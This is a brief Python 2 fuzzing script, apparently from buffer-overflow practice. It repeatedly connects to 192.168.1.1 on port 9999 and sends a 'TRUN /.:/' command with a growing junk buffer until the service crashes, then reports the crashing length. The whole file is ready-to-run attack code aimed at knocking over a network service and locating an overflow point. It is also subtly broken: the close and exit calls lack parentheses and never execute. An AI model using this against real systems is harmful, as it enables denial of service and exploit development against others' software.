#! /usr/bin/python

import sys
import socket
from time import sleep
buffer = 'Nader' * 50

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.1', 9999))
        s.send('TRUN /.:/' + buffer)
        s.close
        sleep(1)
        buffer = buffer + 'Nader' * 100

    except:
        print("Damn its down now at %s bytes" % (str(len(buffer))))
        sys.exit
